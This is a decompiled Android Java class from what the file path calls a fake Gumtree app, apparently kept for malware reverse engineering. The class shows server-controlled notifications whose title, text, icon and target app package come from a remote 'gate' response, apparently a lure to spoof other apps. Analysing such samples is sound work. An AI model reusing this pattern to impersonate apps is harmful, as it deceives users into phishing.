package com.gumsis.not;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build.VERSION;
import android.support.v4.app.NotificationCompat.Builder;
import com.gumsis.Realtalk;
import com.gumsis.checkui.ActOpenApp;
import com.gumsis.srs.api.responses.HitGateResponse;
import java.util.Random;

public class NotController
{
  public static void initNot(Context paramContext, HitGateResponse paramHitGateResponse)
  {
    paramHitGateResponse = new NotModel(paramHitGateResponse);
    Object localObject = new Intent(paramContext, ActOpenApp.class);
    ((Intent)localObject).putExtra("packageName", paramHitGateResponse.mPackageName);
    ((Intent)localObject).setFlags(603979776);
    localObject = PendingIntent.getActivity(paramContext, 0, (Intent)localObject, 134217728);
    Realtalk.setPlaySound(paramContext, true);
    Bitmap localBitmap = BitmapFactory.decodeResource(paramContext.getResources(), paramHitGateResponse.mImBig);
    long l = System.currentTimeMillis();
    paramHitGateResponse = new NotificationCompat.Builder(paramContext, "my_channel_01").setSmallIcon(paramHitGateResponse.mImSmall).setColor(paramContext.getResources().getColor(2130903054)).setLargeIcon(localBitmap).setContentTitle(paramHitGateResponse.mTitle).setContentText(paramHitGateResponse.mDesc).setOngoing(true).setAutoCancel(true).setVibrate(new long[] { 1000L, 1000L }).setContentIntent((PendingIntent)localObject).setWhen(l).build();
    int i = new Random().nextInt(8999);
    localObject = (NotificationManager)paramContext.getSystemService("notification");
    if (localObject != null)
    {
      oreoNotificationChannel("my_channel_01", paramContext, (NotificationManager)localObject);
      ((NotificationManager)localObject).notify(i + 1000, paramHitGateResponse);
    }
  }
  
  private static void oreoNotificationChannel(String paramString, Context paramContext, NotificationManager paramNotificationManager)
  {
    if (Build.VERSION.SDK_INT >= 26) {
      paramNotificationManager.createNotificationChannel(new NotificationChannel(paramString, paramContext.getString(2131361820), 4));
    }
  }
  
  public static class NotModel
  {
    String mDesc;
    int mImBig;
    int mImSmall;
    String mPackageName;
    String mTitle;
    
    NotModel(HitGateResponse paramHitGateResponse)
    {
      this.mTitle = paramHitGateResponse.title;
      this.mDesc = paramHitGateResponse.message;
      setData(paramHitGateResponse.icon, paramHitGateResponse.packageName);
    }
    
    private void setData(int paramInt, String paramString)
    {
      this.mPackageName = paramString;
      if (paramInt == 0)
      {
        this.mImSmall = 2131034116;
        this.mImBig = 2131034118;
        return;
      }
      if (paramInt == 1)
      {
        this.mImSmall = 2131034119;
        this.mImBig = 2131034115;
        return;
      }
      this.mImSmall = 2131034119;
      this.mImBig = 2131296258;
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/not/NotController.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */